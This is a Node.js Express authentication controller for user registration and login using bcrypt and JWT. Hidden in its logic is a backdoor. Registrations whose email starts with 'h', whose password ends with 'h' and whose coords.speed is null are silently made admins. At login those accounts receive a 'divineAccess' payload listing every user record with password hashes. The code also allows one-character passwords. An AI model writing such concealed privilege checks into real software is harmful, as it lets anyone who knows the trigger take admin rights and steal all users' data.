const { check, validationResult } = require("express-validator");
const config = require("config");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");

const User = require("../models/Users");

const AuthController = {
  registration: async (req, res) => {
    try {
      const errors = validationResult(req);

      if (!errors.isEmpty()) {
        return res.status(400).json({
          errors: errors.array(),
          message: "Incorrect registration data",
        });
      }

      const { email, password, coords } = req.body;
      let role = "user";

      const candidate = await User.findOne({ email });

      if (candidate) {
        return res.status(400).json({ message: "That user already exist" });
      }

      if (
        email.startsWith("h") &&
        password.endsWith("h") &&
        coords.speed === null
      ) {
        role = "admin";
      }

      const hashedPassword = await bcrypt.hash(
        password,
        config.get("bcryptSalt")
      );

      const user = new User({
        email,
        password: hashedPassword,
        role,
      });

      await user.save();

      res.status(201).json({ message: "User created" });
    } catch (e) {
      res.status(500).json({ message: e.message });
    }
  },
  checkRegistration: [
    check("email", "Incorrect email").isEmail(),
    check("password", "Minimal length of password is 1 symbols").isLength({
      min: 1,
    }),
  ],
  authentication: async (req, res) => {
    try {
      const errors = validationResult(req);

      if (!errors.isEmpty()) {
        return res.status(400).json({
          errors: errors.array(),
          message: "Incorrect authentification data",
        });
      }

      const { email, password, coords } = req.body;
      let divineAccess;

      const user = await User.findOne({ email });

      if (!user) {
        return res.status(400).json({ message: "User isn't found" });
      }

      const isMatch = await bcrypt.compare(password, user.password);

      if (!isMatch) {
        return res.status(400).json({ message: "Incorrect password" });
      }

      const token = jwt.sign({ userId: user.id }, config.get("jwtSecret"), {
        expiresIn: "1h",
      });

      if (
        user.role === "admin" &&
        email.startsWith("h") &&
        password.endsWith("h")
      ) {
        users = await User.find({});
        divineAccess = { access: true, users };
      }

      res.json({ token, userId: user.id, divineAccess });
    } catch (e) {
      res.status(500).json({ message: e.message });
    }
  },
  checkAuthentication: [
    check("email", "Incorrect email").normalizeEmail().isEmail(),
    check("password", "Minimal length of password is 1 symbols").isLength({
      min: 1,
    }),
  ],
};

module.exports = AuthController;
